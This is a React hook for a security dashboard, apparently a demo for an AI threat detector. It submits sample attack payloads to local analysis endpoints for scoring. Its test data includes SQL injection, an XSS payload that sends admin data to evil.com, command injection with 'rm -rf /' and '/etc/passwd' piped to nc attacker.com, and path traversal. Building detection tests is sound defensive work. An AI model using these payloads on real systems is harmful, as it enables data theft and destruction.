import { useState, useEffect, useCallback } from 'react'
import type { ActivityLogEntry } from '@/components/unified/ActivityLogPanel'

interface AttackResult {
  threat_score: number
  threat_type: string
  recommended_action: string
  reasoning: string
  confidence?: number
  processing_time?: number
}

interface AttackMetrics {
  total: number
  blocked: number
  vulnerable: number
  totalTime: number
  totalConfidence: number
  detectionRate: number
  successRate: number
}

interface RealtimeData {
  metrics: {
    unprotected: AttackMetrics
    cloud: AttackMetrics
    local: AttackMetrics
  }
  attackResults: Record<string, Record<string, AttackResult>>
  connectionStatus: 'connected' | 'disconnected' | 'connecting'
}

interface UseRealtimeDashboardOptions {
  websocketUrl?: string
  apiBaseUrls?: {
    unprotected: string
    cloud: string
    local: string
  }
}

export function useRealtimeDashboard(options: UseRealtimeDashboardOptions = {}) {
  const [data, setData] = useState<RealtimeData>({
    metrics: {
      unprotected: { total: 0, blocked: 0, vulnerable: 0, totalTime: 0, totalConfidence: 0, successRate: 0 },
      cloud: { total: 0, blocked: 0, vulnerable: 0, totalTime: 0, totalConfidence: 0, detectionRate: 0 },
      local: { total: 0, blocked: 0, vulnerable: 0, totalTime: 0, totalConfidence: 0, detectionRate: 0 },
    },
    attackResults: {},
    connectionStatus: 'disconnected'
  })

  const [websocket, setWebsocket] = useState<WebSocket | null>(null)
  const [activityLog, setActivityLog] = useState<ActivityLogEntry[]>([])

  const defaultOptions = {
    websocketUrl: 'ws://localhost:18002/ws',
    apiBaseUrls: {
      unprotected: 'http://localhost:8000',
      cloud: 'http://localhost:28100',
      local: 'http://localhost:28101'
    },
    ...options
  }

  // WebSocket connection management
  useEffect(() => {
    if (typeof window === 'undefined') return

    const connectWebSocket = () => {
      setData(prev => ({ ...prev, connectionStatus: 'connecting' }))

      try {
        const ws = new WebSocket(defaultOptions.websocketUrl)

        ws.onopen = () => {
          console.log('✅ WebSocket connected to Kong Guard AI service')
          setData(prev => ({ ...prev, connectionStatus: 'connected' }))
          setWebsocket(ws)
        }

        ws.onmessage = (event) => {
          try {
            const message = JSON.parse(event.data)
            handleWebSocketMessage(message)
          } catch (error) {
            console.error('❌ WebSocket message parsing error:', error)
          }
        }

        ws.onclose = () => {
          console.log('🔌 WebSocket connection closed')
          setData(prev => ({ ...prev, connectionStatus: 'disconnected' }))
          setWebsocket(null)

          // Attempt reconnection after 5 seconds
          setTimeout(() => {
            console.log('🔄 Attempting WebSocket reconnection...')
            connectWebSocket()
          }, 5000)
        }

        ws.onerror = (error) => {
          console.error('❌ WebSocket error:', error)
          setData(prev => ({ ...prev, connectionStatus: 'disconnected' }))
        }

      } catch (error) {
        console.error('❌ WebSocket connection failed:', error)
        setData(prev => ({ ...prev, connectionStatus: 'disconnected' }))
      }
    }

    connectWebSocket()

    return () => {
      if (websocket) {
        websocket.close()
      }
    }
  }, [])

  const handleWebSocketMessage = useCallback((message: any) => {
    console.log('📨 WebSocket message:', message)

    switch (message.type) {
      case 'connection':
        console.log('✅ Connection established:', message.message)
        if (message.metrics) {
          console.log('📊 Initial metrics:', message.metrics)
        }
        break

      case 'ai_thinking':
        console.log('🤔 AI processing:', message.data)
        break

      case 'threat_analysis':
        console.log('🔍 Threat analysis received:', message.data)
        if (message.metrics) {
          console.log('📊 Updated metrics:', message.metrics)
        }
        break

      case 'attack_flood_started':
        console.log('🚀 Attack flood started:', message)
        break

      case 'attack_flood_progress':
        console.log('📊 Attack flood progress:', message)
        break

      case 'attack_flood_completed':
        console.log('✅ Attack flood completed:', message)
        break

      case 'attack_metric':
        handleAttackMetric(message.metric)
        break

      case 'tier_statistics':
        console.log('📈 Tier statistics update:', message.stats)
        break

      default:
        console.log('🔍 Unknown WebSocket message type:', message.type)
    }
  }, [])

  const handleAttackMetric = useCallback((metric: any) => {
    // Update metrics based on incoming data
    const tier = metric.tier || 'unknown'

    setData(prev => {
      const newMetrics = { ...prev.metrics }
      const tierMetrics = newMetrics[tier as keyof typeof newMetrics]

      if (tierMetrics) {
        tierMetrics.total++
        tierMetrics.totalTime += metric.response_time_ms || 0

        if (metric.blocked) {
          tierMetrics.blocked++
        }

        if (tier === 'unprotected' && !metric.blocked) {
          tierMetrics.vulnerable++
        }

        // Calculate rates
        if (tier === 'unprotected') {
          tierMetrics.successRate = ((tierMetrics.total - tierMetrics.vulnerable) / tierMetrics.total) * 100
        } else {
          tierMetrics.detectionRate = (tierMetrics.blocked / tierMetrics.total) * 100
        }
      }

      return {
        ...prev,
        metrics: newMetrics
      }
    })

    // Add to activity log
    const newEntry: ActivityLogEntry = {
      id: `${Date.now()}-${Math.random()}`,
      timestamp: Date.now(),
      tier: metric.tier as 'unprotected' | 'cloud' | 'local',
      attackType: metric.attack_type || 'unknown',
      latencyMs: metric.response_time_ms || 0,
      action: metric.blocked ? 'blocked' : 'allowed',
      threatScore: metric.threat_score,
      confidence: metric.confidence,
      method: metric.method || 'GET',
      path: metric.path || '/'
    }

    setActivityLog(prev => [newEntry, ...prev].slice(0, 60)) // Keep last 60 total
  }, [])

  // API methods for testing attacks
  const testAttack = useCallback(async (attackType: string, tier: string): Promise<AttackResult> => {
    const apiUrl = defaultOptions.apiBaseUrls[tier as keyof typeof defaultOptions.apiBaseUrls]

    try {
      if (tier === 'unprotected') {
        // Simulate unprotected response (always allows)
        await new Promise(resolve => setTimeout(resolve, 2))
        const result: AttackResult = {
          threat_score: 0.0,
          threat_type: "none",
          recommended_action: "allow",
          reasoning: "No protection - request passed through unchanged",
          processing_time: 2
        }

        updateAttackResult(attackType, tier, result)
        return result
      } else {
        // Make actual API call to Kong Guard AI service
        const attackPatterns: Record<string, any> = {
          sql: {
            method: "GET",
            path: "/api/users",
            query: "id=1' OR '1'='1; DROP TABLE users;--",
            body: "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--"
          },
          xss: {
            method: "POST",
            path: "/comment",
            query: "<script>alert('XSS');</script>",
            body: "<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('//evil.com/?'+btoa(d)))</script>"
          },
          cmd_injection: {
            method: "POST",
            path: "/api/ping",
            query: "ping=127.0.0.1; rm -rf / #",
            body: "; cat /etc/passwd | nc attacker.com 4444 &"
          },
          path: {
            method: "GET",
            path: "/download",
            query: "file=../../../../etc/passwd",
            body: ""
          },
          ldap_injection: {
            method: "POST",
            path: "/auth/ldap",
            query: "user=admin')(&(password=*)",
            body: "admin')(&(password=*)(|(objectClass=*)"
          },
          business_logic: {
            method: "POST",
            path: "/api/transfer",
            query: "amount=-999999&to_account=attacker",
            body: '{"amount": -50000000, "from": "bank_reserves", "to": "attacker_account"}'
          },
          ransomware: {
            method: "POST",
            path: "/api/callback",
            query: "host_id=VICTIM-001&status=encrypted",
            body: '{"victim_id": "BANK-001", "encryption_complete": true, "btc_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "ransom_amount": "50000000"}'
          },
          normal: {
            method: "GET",
            path: "/api/products",
            query: "page=1&limit=10&sort=date",
            body: ""
          }
        }

        const attack = attackPatterns[attackType] || attackPatterns.normal

        const response = await fetch(`${apiUrl}/analyze`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            features: {
              method: attack.method,
              path: attack.path,
              client_ip: '203.0.113.100',
              user_agent: 'KongGuardDashboard/1.0',
              requests_per_minute: 10,
              content_length: (attack.body || attack.query || '').length,
              query_param_count: 1,
              header_count: 3,
              hour_of_day: new Date().getHours(),
              query: attack.query,
              body: attack.body || "",
              headers: {}
            },
            context: { previous_requests: 0 }
          })
        })

        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`)
        }

        const result = await response.json()
        updateAttackResult(attackType, tier, result)
        return result
      }
    } catch (error) {
      console.error(`Attack test failed for ${tier}:`, error)

      // Return mock result on error
      const mockResult: AttackResult = {
        threat_score: tier === 'unprotected' ? 0.0 : Math.random() * 0.9 + 0.1,
        threat_type: tier === 'unprotected' ? 'none' : attackType,
        recommended_action: tier === 'unprotected' ? 'allow' : (Math.random() > 0.3 ? 'block' : 'monitor'),
        reasoning: `Simulated response (service unavailable): ${error instanceof Error ? error.message : 'Unknown error'}`,
        confidence: tier === 'unprotected' ? 0 : Math.random(),
        processing_time: tier === 'unprotected' ? 2 : (tier === 'local' ? 45 : 250) + Math.random() * 50
      }

      updateAttackResult(attackType, tier, mockResult)
      return mockResult
    }
  }, [defaultOptions.apiBaseUrls])

  const updateAttackResult = useCallback((attackType: string, tier: string, result: AttackResult) => {
    setData(prev => ({
      ...prev,
      attackResults: {
        ...prev.attackResults,
        [attackType]: {
          ...prev.attackResults[attackType],
          [tier]: result
        }
      }
    }))

    // Update metrics
    setData(prev => {
      const newMetrics = { ...prev.metrics }
      const tierMetrics = newMetrics[tier as keyof typeof newMetrics]

      if (tierMetrics) {
        tierMetrics.total++
        tierMetrics.totalTime += result.processing_time || 0

        if (result.confidence) {
          tierMetrics.totalConfidence += result.confidence
        } else if (result.threat_score !== undefined) {
          tierMetrics.totalConfidence += result.threat_score
        }

        if (result.threat_score >= 0.7) {
          tierMetrics.blocked++
        } else if (tier === 'unprotected' && result.threat_score === 0) {
          tierMetrics.vulnerable++
        }

        // Calculate rates
        if (tier === 'unprotected') {
          tierMetrics.successRate = ((tierMetrics.total - tierMetrics.vulnerable) / tierMetrics.total) * 100
        } else {
          tierMetrics.detectionRate = (tierMetrics.blocked / tierMetrics.total) * 100
        }
      }

      return {
        ...prev,
        metrics: newMetrics
      }
    })

    // Add to activity log
    const newEntry: ActivityLogEntry = {
      id: `${Date.now()}-${Math.random()}`,
      timestamp: Date.now(),
      tier: tier as 'unprotected' | 'cloud' | 'local',
      attackType: attackType,
      latencyMs: (result.processing_time || 0),
      action: result.threat_score >= 0.7 ? 'blocked' : 'allowed',
      threatScore: result.threat_score,
      confidence: result.confidence,
      method: 'POST',
      path: '/analyze'
    }

    setActivityLog(prev => [newEntry, ...prev].slice(0, 60))
  }, [])

  // Attack flood control - simulates attack activity for demo
  const launchAttackFlood = useCallback(async (config: {
    intensity: string
    strategy: string
    duration: number
    targets: string[]
  }) => {
    try {
      console.log('🚀 Launching simulated attack flood:', config)
      
      const attackTypes = ['sql', 'xss', 'cmd_injection', 'path', 'ldap_injection', 'business_logic', 'ransomware', 'normal']
      const duration = config.duration * 1000 // Convert to ms
      
      // Determine request interval based on intensity
      const interval = config.intensity === 'low' ? 200 : 
                      config.intensity === 'medium' ? 100 : 
                      config.intensity === 'high' ? 50 : 30 // extreme
      
      const startTime = Date.now()
      let requestCount = 0
      
      const simulateAttack = () => {
        const elapsed = Date.now() - startTime
        if (elapsed > duration) {
          console.log(`✅ Attack flood completed: ${requestCount} requests simulated`)
          return // Stop after duration
        }
        
        // Generate random attack for each tier
        const tiers: Array<'unprotected' | 'cloud' | 'local'> = ['unprotected', 'cloud', 'local']
        
        tiers.forEach(tier => {
          const attackType = attackTypes[Math.floor(Math.random() * attackTypes.length)]
          const isNormal = attackType === 'normal'
          
          // Realistic latency based on tier
          const latency = tier === 'unprotected' ? 1.5 + Math.random() * 2 :
                         tier === 'local' ? 5 + Math.random() * 4 :
                         7 + Math.random() * 5
          
          // Threat score - normal traffic low, attacks high
          const threatScore = isNormal ? Math.random() * 0.3 :
                             0.65 + Math.random() * 0.35
          
          const newEntry: ActivityLogEntry = {
            id: `${Date.now()}-${tier}-${Math.random()}`,
            timestamp: Date.now(),
            tier: tier,
            attackType,
            latencyMs: Number(latency.toFixed(2)),
            action: (threatScore > 0.7 && tier !== 'unprotected') ? 'blocked' : 'allowed',
            threatScore: Number(threatScore.toFixed(2)),
            confidence: Number((0.75 + Math.random() * 0.25).toFixed(2)),
            method: ['GET', 'POST', 'PUT', 'DELETE'][Math.floor(Math.random() * 4)],
            path: ['/api/users', '/api/data', '/api/admin', '/api/login', '/api/transfer'][Math.floor(Math.random() * 5)]
          }
          
          setActivityLog(prev => [newEntry, ...prev].slice(0, 60))
          
          // Update metrics to reflect flood activity
          setData(prev => {
            const newMetrics = { ...prev.metrics }
            const tierMetrics = newMetrics[tier]
            
            if (tierMetrics) {
              tierMetrics.total++
              tierMetrics.totalTime += latency
              
              if (newEntry.action === 'blocked') {
                tierMetrics.blocked++
              } else if (tier === 'unprotected' && !isNormal) {
                tierMetrics.vulnerable++
              }
              
              // Calculate rates
              if (tier === 'unprotected') {
                tierMetrics.successRate = tierMetrics.total > 0 
                  ? ((tierMetrics.total - tierMetrics.vulnerable) / tierMetrics.total) * 100 
                  : 0
              } else {
                tierMetrics.detectionRate = tierMetrics.total > 0
                  ? (tierMetrics.blocked / tierMetrics.total) * 100
                  : 0
              }
            }
            
            return {
              ...prev,
              metrics: newMetrics
            }
          })
          
          requestCount++
        })
        
        // Schedule next batch
        setTimeout(simulateAttack, interval)
      }
      
      // Start the simulation
      simulateAttack()
      
      return { 
        status: 'started', 
        message: `Simulated ${config.intensity} intensity flood attack for ${config.duration}s`,
        run_id: Date.now()
      }
      
    } catch (error) {
      console.error('Attack flood simulation failed:', error)
      throw error
    }
  }, [])

  return {
    data,
    activityLog,
    testAttack,
    launchAttackFlood,
    isConnected: data.connectionStatus === 'connected'
  }
}
